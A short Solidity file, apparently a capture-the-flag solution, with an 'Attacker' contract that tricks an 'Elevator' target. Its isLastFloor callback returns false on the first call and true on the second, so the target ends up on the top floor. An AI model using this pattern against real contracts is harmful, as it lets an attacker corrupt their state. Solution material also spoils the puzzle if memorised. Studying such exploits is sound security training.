// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Target.sol";

contract Attacker {
    Elevator public target;
    uint256 n = 0;

    constructor(address _target) public {
        target = Elevator(_target);
    }

    function attack() public {
        target.goTo(10);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (n == 0) {
            n++;
            return false;
        } else {
            return true;
        }
    }
}
